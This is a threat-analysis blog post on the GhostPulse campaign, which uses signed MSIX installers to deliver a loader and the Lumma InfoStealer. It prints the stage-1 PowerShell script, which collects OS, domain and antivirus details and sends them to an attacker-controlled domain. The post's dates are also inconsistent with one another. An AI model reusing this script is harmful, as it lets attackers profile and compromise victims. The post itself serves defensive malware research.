---
layout: post
title: Campaign Analysis - GhostPulse
date: 23-10-2024
categories: [Emerging Threats, Malware]
tag: [Malware, Emerging Threats]
---

![Banner ghostpulse](assets/images/blogs/ghostpulse/Banner-ghostpulse.png)

On the 27th October 2024, [Elastic Security Labs](https://www.elastic.co/security-labs/ghostpulse-haunts-victims-using-defense-evasion-bag-o-tricks#stage-2) followed a campaign to compromise users with signed [MSIX](https://learn.microsoft.com/en-us/windows/msix/overview) application packages to gain initial access. The campaign leverages a stealthy loader that Elastic has named GHOSTPULSE, which decrypts and loads a final payload capable of evading detection. In October 2024, [Elastic Security Labs](https://www.elastic.co/security-labs/tricks-and-treats) posted an update to this campaign, where the GhostPulse loader hides inside a `.png` image using stegonography, eventually demploying itself and loading the **Lumma InfoStealer**

In this post, I will be covering this campaign from the beginning and right up to October 2024, analysing the malware samples as I go, and providing context on the technical aspects that allows these novel techniques to work.

## What is MSIX?

MSIX is a packaging format used by Microsoft, intended to be the successor to the older MSI and ClickOnce formats. It allows developers to package applications into containers for deployment on different devices. It aims to be the universal Windows application package format, and can be used for all types of Windows applications, including UWP (Universal Windows Platform), Windows Forms, Windows Presentation Foundation (WPF), and Win32.

The improtant point is that MSIX packages can be installed with a double-click, making them convinient for adversaries looking to exploit victims with *normal* seeming practises. However, However, MSIX requires access to purchased or stolen code signing certificates making them viable to groups of above-average resources.

In a common attack scenario, victims would be directed to download malicious MSIX packages through compromised websites, search-engine optimization (SEO) techniques, or malvertising through typosquatted domains.

The campaign will be broken down into key stages, with the 2024 evolutions of the malware discussed throughout.

## Stage 1 - The Powershell Script

The fist stage of this attack flow would involve the user getting hold of a malicious MSIX installer, such as through phishing. There are a number of MSIX installer samples for this campaign in existence, the one I cover here is different to what Elastic Security Labs covers.

Below is a Powershell script that serves as the first stage of the infection, in this infection it was called `2609_corp_user0.ps1`:

```powershell

$SS = Get-Random -Minimum 1500 -Maximum 3000
sleep -Milliseconds $SS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


$LoadDomen = "https://fresh-prok.site"



$osCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$urlEncodedOsCaption = [System.Net.WebUtility]::UrlEncode($osCaption)


$domain = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
$AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
$dis = $AV | ForEach-Object {
    $_.displayName
}
$Names = $dis -join ", "


$lnk = "$LoadDomen/?status=start&av=$Names&domain=$domain&os=$urlEncodedOsCaption"
$response = Invoke-RestMethod -Uri $lnk -Method GET
if ($response -match "404 HTTP Error") {
    Write-Host "Received 404 HTTP Error."

    exit
}
```